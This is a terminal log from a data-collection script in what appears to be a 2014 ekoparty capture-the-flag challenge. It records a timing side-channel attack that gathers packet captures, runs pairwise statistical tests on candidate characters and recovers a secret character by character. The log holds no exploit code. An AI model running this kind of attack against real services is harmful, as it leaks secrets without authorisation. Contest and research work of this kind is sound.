user@computer:~/code/2014_ekoparty/hue$ ./collect_data.py 
CURRENT_GUESS:  
Collecting data:
Making new username generators with prefix: 
0 0.021797 4587.799569
Current guess:  
Parsing data...
Parsing  data/2014-10-30-15-42-33.pcap
Calculating next guess...
Key Count (Number of loaded samples)
k1 k2 p
{}
Collecting data:
100 2.052389 49.246723
200 3.725981 59.751716
300 5.405142 59.553557
400 7.084768 59.537056
500 8.764874 59.520057
600 10.444437 59.539295
700 12.119424 59.701962
800 13.795305 59.670103
900 15.475252 59.525691
1000 17.154953 59.534402
1100 18.836056 59.484755
1200 20.516949 59.492189
1300 22.191262 59.725987
1400 23.868848 59.609468
1500 25.549627 59.496222
1600 27.230972 59.476185
1700 28.911465 59.506352
1800 30.591017 59.539684
1900 32.266094 59.698750
2000 33.944932 59.565008
2100 35.625675 59.497497
2200 37.306268 59.502806
2300 38.986694 59.508724
2400 40.664425 59.604310
2500 42.339060 59.714507
2600 44.018841 59.531563
2700 45.699345 59.505963
2800 47.380479 59.483659
2900 49.061013 59.504891
3000 50.737846 59.636234
Current guess:  
Parsing data...
Parsing  data/2014-10-30-15-43-04.pcap
Parsing  data/2014-10-30-15-43-19.pcap
Parsing  data/2014-10-30-15-43-34.pcap
Calculating next guess...
Key Count (Number of loaded samples)
1 323
0 323
3 324
2 324
5 324
4 323
7 324
6 324
Collecting data:
3100 53.190881 40.765825
3200 54.868598 59.604809
3300 56.543682 59.698503
3400 58.223651 59.524905
3500 59.904434 59.496079
3600 61.585743 59.477467
3700 63.266099 59.511198
3800 64.942487 59.652061
3900 66.618429 59.667938
4000 68.298785 59.511198
4100 69.979298 59.505642
4200 71.659525 59.515766
4300 73.340412 59.492400
4400 75.015829 59.686635
4500 76.693297 59.613654
4600 78.374456 59.482773
4700 80.054846 59.509990
4800 81.735336 59.506461
4900 83.413453 59.590599
5000 85.087795 59.724949
5100 86.767612 59.530295
5200 88.447880 59.514314
5300 90.128760 59.492653
5400 91.809318 59.504047
5500 93.486276 59.631783
5600 95.161731 59.685276
5700 96.842338 59.502316
5800 98.522890 59.504258
5900 100.203443 59.504216
6000 101.885544 59.449462
Current guess:  
Parsing data...
Parsing  data/2014-10-30-15-43-49.pcap
Parsing  data/2014-10-30-15-44-04.pcap
Parsing  data/2014-10-30-15-44-19.pcap
Calculating next guess...
Key Count (Number of loaded samples)
1 653
0 653
3 653
2 652
5 653
4 652
7 653
6 653
Collecting data:
6100 104.366200 40.311919
6200 106.045902 59.534368
6300 107.720926 59.700636
6400 109.399194 59.585241
6500 111.079377 59.517329
6600 112.759841 59.507373
6700 114.440040 59.516763
6800 116.119182 59.554225
6900 117.793456 59.727381
7000 119.472921 59.542769
7100 121.153302 59.510311
7200 122.833970 59.500155
7300 124.514603 59.501388
7400 126.195237 59.501354
7500 128.868107 37.412969
7600 130.548749 59.501067
7700 132.225119 59.652705
7800 133.901667 59.646368
7900 135.582410 59.497497
8000 137.264129 59.462964
8100 138.944745 59.501996
8200 140.625388 59.501033
8300 142.300747 59.688699
8400 143.977848 59.626696
8500 145.658898 59.486637
8600 147.339683 59.496003
8700 149.020430 59.497362
8800 150.700235 59.530718
8900 152.375625 59.687595
9000 154.054161 59.575728
Current guess:  
Parsing data...
Parsing  data/2014-10-30-15-44-34.pcap
Parsing  data/2014-10-30-15-44-49.pcap
Parsing  data/2014-10-30-15-45-04.pcap
Parsing  data/2014-10-30-15-45-19.pcap
Calculating next guess...
Key Count (Number of loaded samples)
1 1086
0 1086
3 1086
2 1085
5 1087
4 1085
7 1086
6 1086
Collecting data:
9100 156.673037 38.184317
9200 158.348034 59.701605
9300 160.027890 59.528910
9400 161.708434 59.504545
9500 163.389538 59.484713
9600 165.070278 59.497607
9700 166.747146 59.634988
9800 168.422856 59.676198
9900 170.103971 59.484325
10000 171.784474 59.505997
10100 173.464124 59.536210
10200 175.143959 59.529653
10300 176.818926 59.702675
10400 178.495001 59.663202
10500 180.175445 59.508082
10600 181.855781 59.511907
10700 183.536164 59.510235
10800 185.214859 59.570084
10900 186.888716 59.742261
11000 188.566264 59.610815
11100 190.245713 59.543335
11200 191.925381 59.535577
11300 193.605880 59.506132
11400 195.284421 59.575550
11500 196.957915 59.755224
11600 198.636868 59.560923
11700 200.316759 59.527676
11800 201.996481 59.533658
11900 203.676395 59.526857
12000 205.355988 59.538230
Current guess:  
Parsing data...
Parsing  data/2014-10-30-15-45-34.pcap
Parsing  data/2014-10-30-15-45-49.pcap
Parsing  data/2014-10-30-15-46-04.pcap
Calculating next guess...
Key Count (Number of loaded samples)
1 1415
0 1414
3 1414
2 1413
5 1415
4 1413
7 1414
6 1413
Collecting data:
12100 207.898593 39.329744
12200 209.576991 59.580628
12300 211.252665 59.677472
12400 212.930937 59.585097
12500 214.610572 59.536751
12600 216.291100 59.505102
12700 217.971595 59.506276
12800 219.648856 59.621017
12900 221.322887 59.736050
13000 223.003151 59.514457
13100 224.683655 59.505955
13200 226.363987 59.512051
13300 228.044045 59.521755
13400 229.720368 59.654377
13500 231.395510 59.696430
13600 233.075694 59.517295
13700 234.755519 59.530008
13800 236.436440 59.491193
13900 238.122525 59.308991
14000 239.799128 59.644409
14100 241.475633 59.647904
14200 243.155854 59.515977
14300 244.835733 59.528099
14400 246.515489 59.532459
14500 248.195290 59.530862
14600 249.869442 59.731728
14700 251.546821 59.616823
14800 253.226846 59.522920
14900 254.906831 59.524339
15000 256.586661 59.529839
Current guess:  
Parsing data...
Parsing  data/2014-10-30-15-46-19.pcap
Parsing  data/2014-10-30-15-46-34.pcap
Parsing  data/2014-10-30-15-46-49.pcap
Parsing  data/2014-10-30-15-47-04.pcap
Calculating next guess...
Key Count (Number of loaded samples)
1 1855
0 1855
3 1854
2 1853
5 1854
4 1854
7 1854
6 1854
k1 k2 p
1  0  0.443528836412
1  3  0.655348112077
1  2  0.177796861372
1  5  0.804937027841
1  4  0.63993258809
1  7  0.871946217258
1  6  0.183276512061
0  3  0.217756961238
0  2  0.966988483563
0  5  0.528681831774
0  4  0.431500353701
0  7  0.101997136103
0  6  0.00614589488871
3  2  0.115584379244
3  5  0.867725905998
3  4  0.977837562293
3  7  0.687650921976
3  6  0.179296707168
2  5  0.213939536204
2  4  0.144637003292
2  7  0.0227317235389
2  6  0.000363670721562
5  4  0.894276500955
5  7  0.160801786971
5  6  0.184922162581
4  7  0.758990620864
4  6  0.211796816625
7  6  0.200155346611
{'0': 1, '2': 2, '6': 2, '7': 1}
Collecting data:
15100 259.409208 35.428991
15200 261.089074 59.528563
15300 262.769703 59.501531
15400 264.450684 59.489075
15500 266.125799 59.697390
15600 267.803814 59.594223
15700 269.484612 59.495547
15800 271.165651 59.487025
15900 272.846550 59.491969
16000 274.525589 59.557878
16100 276.200226 59.714439
16200 277.879130 59.562665
16300 279.560920 59.460452
16400 281.241884 59.489674
16500 282.922813 59.490914
16600 284.599969 59.624747
16700 286.277082 59.626272
16800 287.957928 59.493851
16900 289.638756 59.494484
17000 291.319652 59.492087
17100 293.000388 59.497742
17200 294.675830 59.685743
17300 296.353674 59.600295
17400 298.034166 59.506385
17500 299.714800 59.501354
17600 301.395838 59.487050
17700 303.075620 59.531538
17800 304.750188 59.716896
17900 306.428546 59.582041
18000 308.109166 59.501852
Current guess:  
Parsing data...
Parsing  data/2014-10-30-15-47-19.pcap
Parsing  data/2014-10-30-15-47-34.pcap
Parsing  data/2014-10-30-15-47-49.pcap
Calculating next guess...
Key Count (Number of loaded samples)
1 2180
0 2181
3 2181
2 2179
5 2181
4 2180
7 2181
6 2180
k1 k2 p
1  0  0.650613564123
1  3  0.759538470582
1  2  0.14737896692
1  5  0.827715678641
1  4  0.75671799315
1  7  0.852093319812
1  6  0.0498026563892
0  3  0.536222222457
0  2  0.729145890527
0  5  0.586722635389
0  4  0.729520037748
0  7  0.155600507831
0  6  0.00396018158052
3  2  0.164611393735
3  5  0.657103921935
3  4  0.908905181158
3  7  0.715170551714
3  6  0.0265370640082
2  5  0.171659776612
2  4  0.132398944833
2  7  0.0120371772785
2  6  3.07207838629e-05
5  4  0.944469113027
5  7  0.237032106867
5  6  0.0566142358106
4  7  0.665836482497
4  6  0.0643447104825
7  6  0.0374611063381
{'0': 1, '1': 1, '2': 2, '3': 1, '4': 1, '5': 1, '6': 7, '7': 2}
CHANGING GUESS:  6
Guess time:  309.173008919
mkdir -p data
mkdir -p tmp
rm -rf data/*
rm -rf tmp/*
rm -rf *.pyc
Collecting data:
Making new username generators with prefix: 6
18100 310.862478 36.319893
18200 312.541152 59.570829
18300 314.222335 59.481929
18400 315.903082 59.497353
18500 317.583616 59.504891
18600 319.262643 59.558309
18700 320.937275 59.714609
18800 322.615340 59.592445
18900 324.295140 59.530895
19000 325.975399 59.514635
19100 327.655169 59.531960
19200 330.326937 37.428400
19300 332.006748 59.530507
19400 333.687051 59.513072
19500 335.362929 59.670221
19600 337.037443 59.718818
19700 338.717087 59.536422
19800 340.396911 59.530050
19900 342.076837 59.526426
20000 343.757205 59.510776
20100 345.432054 59.706874
20200 347.108025 59.666911
20300 348.787977 59.525505
20400 350.468088 59.519879
20500 352.147970 59.527989
20600 353.826778 59.566074
20700 355.500173 59.758757
20800 357.177209 59.629010
20900 358.860238 59.416685
21000 360.542558 59.441719
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-15-48-19.pcap
Parsing  data/2014-10-30-15-48-34.pcap
Parsing  data/2014-10-30-15-48-49.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 327
61 327
62 328
63 328
64 328
65 327
66 327
67 328
Collecting data:
21100 363.017494 40.405085
21200 364.698530 59.487126
21300 366.379566 59.487126
21400 368.059544 59.524593
21500 369.733540 59.737292
21600 371.409877 59.653876
21700 373.091166 59.478176
21800 374.770812 59.536354
21900 376.450838 59.522895
22000 378.129522 59.570473
22100 379.803362 59.742865
22200 381.481118 59.603420
22300 383.160926 59.530617
22400 384.840718 59.531174
22500 386.520562 59.529341
22600 388.197938 59.616924
22700 389.871620 59.748507
22800 391.550468 59.564653
22900 393.230339 59.528378
23000 394.911155 59.494914
23100 396.589136 59.595434
23200 398.262515 59.759327
23300 399.940530 59.594215
23400 401.620675 59.518680
23500 403.300720 59.522211
23600 404.980887 59.517895
23700 406.657639 59.639109
23800 408.331140 59.754968
23900 410.011698 59.504047
24000 411.692048 59.511417
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-15-49-04.pcap
Parsing  data/2014-10-30-15-49-19.pcap
Parsing  data/2014-10-30-15-49-34.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 656
61 655
62 657
63 658
64 658
65 657
66 656
67 656
Collecting data:
24100 414.152475 40.643351
24200 415.832376 59.527313
24300 417.512171 59.531073
24400 419.191914 59.532923
24500 420.868261 59.653520
24600 422.542119 59.742218
24700 424.221666 59.539870
24800 425.901020 59.546700
24900 427.580443 59.544265
25000 429.260252 59.530574
25100 430.935442 59.694722
25200 432.610846 59.687094
25300 434.291199 59.511308
25400 435.970812 59.537529
25500 437.650545 59.533270
25600 439.330048 59.541425
25700 441.004230 59.730656
25800 442.680174 59.667870
25900 444.359785 59.537596
26000 446.039566 59.531563
26100 447.718800 59.550969
26200 449.397166 59.581753
26300 451.070782 59.750865
26400 452.748088 59.619416
26500 454.427956 59.528487
26600 456.108067 59.519871
26700 457.787849 59.531538
26800 459.464735 59.634343
26900 461.137944 59.765399
27000 462.817318 59.545998
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-15-49-49.pcap
Parsing  data/2014-10-30-15-50-04.pcap
Parsing  data/2014-10-30-15-50-19.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 985
61 985
62 986
63 987
64 987
65 986
66 986
67 985
Collecting data:
27100 465.339525 39.647816
27200 467.016222 59.641068
27300 468.695904 59.535078
27400 470.375624 59.533734
27500 472.055408 59.531461
27600 473.733223 59.601328
27700 475.406303 59.770006
27800 477.084248 59.596713
27900 478.763706 59.543014
28000 481.443583 37.315145
28100 483.122777 59.552381
28200 484.802275 59.541603
28300 486.481979 59.534301
28400 488.161413 59.543868
28500 489.836342 59.704027
28600 491.512017 59.677438
28700 493.193003 59.488898
28800 494.873826 59.494661
28900 496.554477 59.500755
29000 498.235719 59.479837
29100 499.910232 59.718860
29200 501.587597 59.617314
29300 503.268719 59.484080
29400 504.949289 59.503625
29500 506.629861 59.503549
29600 508.308937 59.556567
29700 509.983632 59.712365
29800 511.662420 59.566776
29900 513.343209 59.495868
30000 515.024009 59.495480
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-15-50-34.pcap
Parsing  data/2014-10-30-15-50-49.pcap
Parsing  data/2014-10-30-15-51-04.pcap
Parsing  data/2014-10-30-15-51-19.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 1418
61 1418
62 1419
63 1419
64 1420
65 1419
66 1419
67 1418
Collecting data:
30100 517.676048 37.706835
30200 519.356858 59.495125
30300 521.037630 59.496476
30400 522.719084 59.472331
30500 524.394954 59.670502
30600 526.072649 59.605589
30700 527.753409 59.496898
30800 529.434140 59.497919
30900 531.114998 59.493429
31000 532.794550 59.539684
31100 534.468971 59.722134
31200 536.148261 59.548983
31300 537.828755 59.506309
31400 539.509426 59.500046
31500 541.190274 59.493775
31600 542.868402 59.590210
31700 544.543044 59.714261
31800 546.222924 59.528056
31900 547.903608 59.499590
32000 549.584345 59.497708
32100 551.265007 59.500358
32200 552.941849 59.635912
32300 554.617907 59.663804
32400 556.298514 59.502316
32500 557.979586 59.485852
32600 559.660249 59.500324
32700 561.341008 59.496931
32800 563.015655 59.714074
32900 564.692053 59.651713
33000 566.371853 59.530895
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-15-51-34.pcap
Parsing  data/2014-10-30-15-51-49.pcap
Parsing  data/2014-10-30-15-52-04.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 1746
61 1745
62 1746
63 1747
64 1748
65 1746
66 1747
67 1746
k1 k2 p
60  61  0.418610085635
60  62  0.898975213119
60  63  0.0782989985441
60  64  0.21015240178
60  65  0.173782138692
60  66  0.664124507371
60  67  0.306683097244
61  62  0.563920631728
61  63  0.102348972086
61  64  0.164276340364
61  65  0.210639040891
61  66  0.285754510316
61  67  0.526427867533
62  63  0.293585228227
62  64  0.535990682718
62  65  0.232903251223
62  66  0.466206754699
62  67  0.557973977731
63  64  0.389622936205
63  65  0.00854040396552
63  66  0.0672109568438
63  67  0.0356318452469
64  65  0.0127432653002
64  66  0.184045082484
64  67  0.0584015208342
65  66  0.0693589201032
65  67  0.522173480722
66  67  0.293238017969
{'60': 1, '63': 4, '64': 2, '65': 3, '66': 2, '67': 2}
Collecting data:
33100 569.024618 37.696516
33200 570.702189 59.609994
33300 572.382116 59.526401
33400 574.062081 59.525049
33500 575.741993 59.526924
33600 577.419448 59.614120
33700 579.093666 59.729380
33800 581.772135 37.334758
33900 583.449690 59.610570
34000 585.147203 58.909707
34100 586.826506 59.548518
34200 588.506400 59.527566
34300 590.186793 59.509889
34400 591.866824 59.522709
34500 593.543477 59.642628
34600 595.219824 59.653528
34700 596.900581 59.496999
34800 598.581918 59.476472
34900 600.262979 59.486240
35000 601.944033 59.486493
35100 603.619268 59.693117
35200 605.296756 59.612942
35300 606.977720 59.489674
35400 608.658392 59.500012
35500 610.339104 59.498594
35600 612.018694 59.538340
35700 613.694036 59.689302
35800 615.373327 59.548940
35900 617.054017 59.499379
36000 618.734585 59.503684
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-15-52-19.pcap
Parsing  data/2014-10-30-15-52-34.pcap
Parsing  data/2014-10-30-15-52-49.pcap
Parsing  data/2014-10-30-15-53-04.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 2178
61 2177
62 2178
63 2178
64 2179
65 2178
66 2179
67 2178
k1 k2 p
60  61  0.629833250661
60  62  0.552805894899
60  63  0.0394467154338
60  64  0.400408157338
60  65  0.217543547341
60  66  0.838262744054
60  67  0.243602158046
61  62  0.457264366063
61  63  0.0930101567533
61  64  0.32290237546
61  65  0.141961737531
61  66  0.608080617949
61  67  0.222309417312
62  63  0.683003382854
62  64  0.540100694375
62  65  0.089595721299
62  66  0.381490081619
62  67  0.0841560799749
63  64  0.244824907487
63  65  0.00743921257928
63  66  0.0154439208987
63  67  0.00238296765
64  65  0.0334897323795
64  66  0.352490389166
64  67  0.0370277015245
65  66  0.0897767157508
65  67  0.4973797646
66  67  0.356630834677
{'60': 1, '61': 1, '62': 2, '63': 5, '64': 2, '65': 4, '66': 2, '67': 3}
Collecting data:
36100 621.578765 35.159520
36200 623.259502 59.497708
36300 624.940337 59.494239
36400 626.621245 59.491657
36500 628.300977 59.533304
36600 629.975897 59.704350
36700 631.654955 59.557201
36800 633.335661 59.498805
36900 635.016584 59.491125
37000 636.697347 59.496788
37100 638.375890 59.575474
37200 640.050579 59.712586
37300 641.729918 59.547232
37400 643.411058 59.483448
37500 645.091951 59.492189
37600 646.772089 59.518917
37700 648.449227 59.625391
37800 650.124636 59.686915
37900 651.804365 59.533413
38000 653.484391 59.522886
38100 655.164272 59.528031
38200 656.844471 59.516754
38300 658.519716 59.692760
38400 660.196094 59.652417
38500 661.876266 59.517717
38600 663.556146 59.528065
38700 665.236497 59.511375
38800 666.915844 59.546954
38900 668.589770 59.739802
39000 670.267072 59.619551
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-15-53-19.pcap
Parsing  data/2014-10-30-15-53-34.pcap
Parsing  data/2014-10-30-15-53-49.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 2504
61 2503
62 2505
63 2504
64 2506
65 2505
66 2504
67 2503
k1 k2 p
60  61  0.583508287053
60  62  0.411740199287
60  63  0.0255368702021
60  64  0.409275524115
60  65  0.278144807981
60  66  0.977176751239
60  67  0.232323748972
61  62  0.427160984164
61  63  0.0994376886913
61  64  0.599866521897
61  65  0.265636650629
61  66  0.733272625304
61  67  0.223365353571
62  63  0.380958670833
62  64  0.417275735611
62  65  0.0598145635188
62  66  0.72154910751
62  67  0.0357842376499
63  64  0.137666466007
63  65  0.00651447801088
63  66  0.0655751767791
63  67  0.00199459597432
64  65  0.0304450540136
64  66  0.521437721055
64  67  0.0120420777073
65  66  0.153162110127
65  67  0.359222275987
66  67  0.138843677427
{'60': 1, '61': 1, '62': 2, '63': 5, '64': 2, '65': 3, '66': 1, '67': 3}
Collecting data:
39100 673.065115 35.739265
39200 674.739597 59.719966
39300 676.416245 59.642806
39400 678.096105 59.528775
39500 679.776077 59.524796
39600 682.456188 37.311888
39700 684.136280 59.520547
39800 685.816009 59.533413
39900 687.495985 59.524660
40000 689.174095 59.590853
40100 690.848081 59.737658
40200 692.526924 59.564830
40300 694.207525 59.502519
40400 695.887540 59.523283
40500 697.567495 59.525404
40600 699.244566 59.627764
40700 700.918668 59.733514
40800 702.598325 59.535965
40900 704.278327 59.523740
41000 705.958765 59.508293
41100 707.638583 59.530262
41200 709.314321 59.675196
41300 710.989895 59.681047
41400 712.670117 59.515944
41500 714.349701 59.538551
41600 716.029967 59.514390
41700 717.709720 59.532560
41800 719.384147 59.721922
41900 721.061304 59.624713
42000 722.741274 59.524872
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-15-54-04.pcap
Parsing  data/2014-10-30-15-54-19.pcap
Parsing  data/2014-10-30-15-54-34.pcap
Parsing  data/2014-10-30-15-54-49.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 2935
61 2933
62 2936
63 2935
64 2937
65 2936
66 2936
67 2934
k1 k2 p
60  61  0.735595922685
60  62  0.367836867732
60  63  0.06137173834
60  64  0.38078822695
60  65  0.552233573276
60  66  0.944765867588
60  67  0.246075816029
61  62  0.0987390379004
61  63  0.0456886219595
61  64  0.234959664041
61  65  0.601770073618
61  66  0.71145561506
61  67  0.408903397591
62  63  0.66900203561
62  64  0.567296758521
62  65  0.0477096249324
62  66  0.834617908256
62  67  0.0344266908194
63  64  0.445196953905
63  65  0.015475300057
63  66  0.156592547876
63  67  0.00314323773238
64  65  0.0440872299962
64  66  0.626734922827
64  67  0.00927356353436
65  66  0.193674659629
65  67  0.377718756283
66  67  0.0807774369397
{'60': 1, '61': 2, '62': 3, '63': 4, '64': 2, '65': 3, '66': 1, '67': 4}
Collecting data:
42100 725.733391 33.421151
42200 727.406721 59.761081
42300 729.085016 59.584276
42400 730.764760 59.532881
42500 732.444648 59.527778
42600 734.124781 59.519102
42700 735.800371 59.680469
42800 737.475521 59.696150
42900 739.155226 59.534258
43000 740.835028 59.530828
43100 742.514579 59.539718
43200 744.194520 59.525902
43300 745.868699 59.730775
43400 747.544860 59.660138
43500 749.224529 59.535534
43600 750.904366 59.529586
43700 752.584176 59.530549
43800 754.263180 59.559113
43900 755.936629 59.756824
44000 757.613915 59.620128
44100 759.293636 59.533701
44200 760.973152 59.540960
44300 762.653355 59.516619
44400 764.331236 59.598982
44500 766.005264 59.736152
44600 767.684351 59.556178
44700 769.363755 59.544933
44800 771.043657 59.527288
44900 772.722528 59.563832
45000 774.395924 59.758723
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-15-55-04.pcap
Parsing  data/2014-10-30-15-55-19.pcap
Parsing  data/2014-10-30-15-55-34.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 3261
61 3258
62 3261
63 3260
64 3262
65 3262
66 3262
67 3259
k1 k2 p
60  61  0.886069783312
60  62  0.102708951269
60  63  0.0179303443566
60  64  0.169149574702
60  65  0.775988586315
60  66  0.724571057875
60  67  0.630353249346
61  62  0.098251166964
61  63  0.0349337802651
61  64  0.205059027242
61  65  0.775816643922
61  66  0.700398788909
61  67  0.580615172058
62  63  0.887685324724
62  64  0.545866001432
62  65  0.0826014553173
62  66  0.41605768628
62  67  0.00965259040873
63  64  0.56014342384
63  65  0.0430612539107
63  66  0.0808150595697
63  67  0.00145508482122
64  65  0.117467954892
64  66  0.57224308315
64  67  0.0171485107588
65  66  0.229499808704
65  67  0.163868608376
66  67  0.15871957917
{'60': 1, '61': 2, '62': 3, '63': 5, '64': 1, '65': 2, '66': 1, '67': 3}
Collecting data:
45100 777.320106 34.197596
45200 779.000087 59.524483
45300 780.674629 59.717823
45400 783.348332 37.401313
45500 785.027120 59.566785
45600 786.700454 59.760928
45700 788.377739 59.620162
45800 790.057611 59.528344
45900 791.737396 59.531428
46000 793.417609 59.516265
46100 795.095967 59.582041
46200 796.769589 59.750652
46300 798.447630 59.593300
46400 800.127304 59.535365
46500 801.807036 59.533304
46600 803.486798 59.532239
46700 805.163395 59.644630
46800 806.837269 59.741657
46900 808.516404 59.554470
47000 810.196447 59.522287
47100 811.876679 59.515589
47200 813.557616 59.490628
47300 815.234203 59.644986
47400 816.910335 59.661174
47500 818.591836 59.470670
47600 820.273033 59.481432
47700 821.953737 59.498873
47800 823.634966 59.480301
47900 825.310634 59.677693
48000 826.988413 59.602607
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-15-55-49.pcap
Parsing  data/2014-10-30-15-56-04.pcap
Parsing  data/2014-10-30-15-56-19.pcap
Parsing  data/2014-10-30-15-56-34.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 3690
61 3688
62 3691
63 3691
64 3692
65 3691
66 3692
67 3690
k1 k2 p
60  61  0.486465587648
60  62  0.239059577223
60  63  0.00673167663936
60  64  0.0958326392539
60  65  0.717609640666
60  66  0.749497937479
60  67  0.711107580272
61  62  0.132187403425
61  63  0.0060532564702
61  64  0.0820765625927
61  65  0.658298824422
61  66  0.612262646784
61  67  0.877473945457
62  63  0.364507569773
62  64  0.630032232207
62  65  0.0890595849584
62  66  0.678772925347
62  67  0.0615831813724
63  64  0.494612183627
63  65  0.0137970127473
63  66  0.0273263554187
63  67  0.000892366518035
64  65  0.0755079405411
64  66  0.358010247454
64  67  0.020941821578
65  66  0.118788464617
65  67  0.277036483728
66  67  0.278880285281
{'60': 2, '61': 2, '62': 2, '63': 5, '64': 4, '65': 3, '66': 1, '67': 3}
Collecting data:
48100 830.091298 32.228072
48200 831.772149 59.493674
48300 834.442374 37.450026
48400 836.123238 59.493218
48500 837.803020 59.531529
48600 839.477497 59.720144
48700 841.156551 59.557345
48800 842.837134 59.503161
48900 844.517761 59.501599
49000 846.198609 59.493783
49100 847.877084 59.577886
49200 849.552253 59.695470
49300 851.231948 59.534622
49400 852.913352 59.474102
49500 854.594128 59.496332
49600 856.275646 59.470071
49700 857.953472 59.600939
49800 859.628443 59.702522
49900 861.308688 59.515133
50000 862.989638 59.490172
50100 864.670615 59.489210
50200 866.351397 59.496113
50300 868.028439 59.628799
50400 869.704394 59.667480
50500 871.385377 59.488999
50600 873.066423 59.486772
50700 874.747066 59.501033
50800 876.427971 59.491767
50900 878.103775 59.672845
51000 879.780659 59.634419
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-15-56-49.pcap
Parsing  data/2014-10-30-15-57-04.pcap
Parsing  data/2014-10-30-15-57-19.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 4007
61 4006
62 4008
63 4008
64 4010
65 4007
66 4008
67 4006
k1 k2 p
60  61  0.374768834229
60  62  0.198444737766
60  63  0.0105231295082
60  64  0.0806711657817
60  65  0.859879584691
60  66  0.534241447037
60  67  0.419861895354
61  62  0.0912988362608
61  63  0.0165507982907
61  64  0.0744304723945
61  65  0.803524713831
61  66  0.486149359895
61  67  0.845184148231
62  63  0.435105594198
62  64  0.383201970169
62  65  0.0629715520208
62  66  0.801534822712
62  67  0.0670425951181
63  64  0.366111836184
63  65  0.0173572549941
63  66  0.0811813220213
63  67  0.00252263506247
64  65  0.0614822185738
64  66  0.522833483684
64  67  0.0324398507263
65  66  0.123769148554
65  67  0.255923089428
66  67  0.209593030876
{'60': 2, '61': 3, '62': 3, '63': 5, '64': 4, '65': 3, '66': 1, '67': 3}
Collecting data:
51100 882.799535 33.124911
51200 884.479617 59.520910
51300 886.154662 59.699888
51400 887.833129 59.578173
51500 889.513895 59.496678
51600 891.194627 59.497885
51700 892.875478 59.493674
51800 894.554237 59.567817
51900 896.229393 59.695929
52000 897.908989 59.538129
52100 899.589665 59.499868
52200 901.270980 59.477256
52300 902.952079 59.484890
52400 904.629739 59.606834
52500 906.304947 59.694085
52600 907.986052 59.484679
52700 909.666640 59.502983
52800 911.347437 59.495589
52900 913.028384 59.490273
53000 914.704766 59.652273
53100 916.381582 59.636836
53200 918.062477 59.492121
53300 919.743429 59.490096
53400 921.424004 59.503448
53500 923.104893 59.492324
53600 924.780115 59.693584
53700 926.457671 59.610527
53800 928.138394 59.498206
53900 929.819437 59.486873
54000 931.500823 59.474743
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-15-57-34.pcap
Parsing  data/2014-10-30-15-57-49.pcap
Parsing  data/2014-10-30-15-58-04.pcap
Parsing  data/2014-10-30-15-58-19.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 4444
61 4442
62 4444
63 4444
64 4447
65 4444
66 4445
67 4442
k1 k2 p
60  61  0.566708326003
60  62  0.235796479551
60  63  0.0117052253043
60  64  0.213548431894
60  65  0.650631679921
60  66  0.35222449094
60  67  0.463160453983
61  62  0.0799012678982
61  63  0.0124793239063
61  64  0.16499353413
61  65  0.59218288078
61  66  0.448397418506
61  67  0.550468202308
62  63  0.303592512756
62  64  0.625626857542
62  65  0.0149739980009
62  66  0.626472783736
62  67  0.0217224048064
63  64  0.536823455868
63  65  0.00734136369414
63  66  0.0649511944199
63  67  0.000644384040243
64  65  0.0236061669957
64  66  0.516222715894
64  67  0.0245380653989
65  66  0.120709667759
65  67  0.32063507055
66  67  0.108234287346
{'60': 1, '61': 2, '62': 3, '63': 5, '64': 2, '65': 3, '66': 1, '67': 3}
Collecting data:
54100 935.731485 23.636963
54200 937.412178 59.499261
54300 939.089468 59.619984
54400 940.765894 59.650712
54500 942.447017 59.484047
54600 944.128429 59.473824
54700 945.809436 59.488155
54800 947.490171 59.497775
54900 949.165262 59.698248
55000 950.843227 59.596001
55100 952.523701 59.507019
55200 954.204992 59.478100
55300 955.885814 59.494703
55400 957.564796 59.559899
55500 959.239329 59.718146
55600 960.918836 59.541281
55700 962.598752 59.526781
55800 964.278445 59.534689
55900 965.958310 59.528597
56000 967.635164 59.635479
56100 969.308703 59.753615
56200 970.987982 59.549363
56300 972.667644 59.535788
56400 974.347433 59.531292
56500 976.027553 59.519558
56600 977.703421 59.670569
56700 979.378461 59.700067
56800 981.058122 59.535822
56900 982.737975 59.529020
57000 984.417918 59.525826
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-15-58-34.pcap
Parsing  data/2014-10-30-15-58-49.pcap
Parsing  data/2014-10-30-15-59-04.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 4760
61 4758
62 4760
63 4760
64 4762
65 4759
66 4761
67 4759
k1 k2 p
60  61  0.466988964154
60  62  0.25028325917
60  63  0.0246922386756
60  64  0.277441321551
60  65  0.512887021493
60  66  0.296658757159
60  67  0.436328102767
61  62  0.0530225887429
61  63  0.00784393824882
61  64  0.110746342307
61  65  0.863177442989
61  66  0.382708822205
61  67  0.846737665889
62  63  0.439475605196
62  64  0.716388205236
62  65  0.0158129353121
62  66  0.481770303579
62  67  0.0391836448658
63  64  0.387314527868
63  65  0.00585451521894
63  66  0.115018114668
63  67  0.00253654358492
64  65  0.0242372112466
64  66  0.525908601081
64  67  0.0550603687701
65  66  0.228351898841
65  67  0.52087028118
66  67  0.154696693889
{'60': 1, '61': 2, '62': 3, '63': 4, '64': 2, '65': 3, '67': 3}
Collecting data:
57100 987.532643 32.105564
57200 989.212268 59.537098
57300 990.892286 59.523165
57400 992.572325 59.522430
57500 994.252150 59.530008
57600 995.927396 59.692726
57700 997.602721 59.689914
57800 999.282356 59.536743
57900 1000.962117 59.532281
58000 1002.642166 59.522075
58100 1004.321976 59.530540
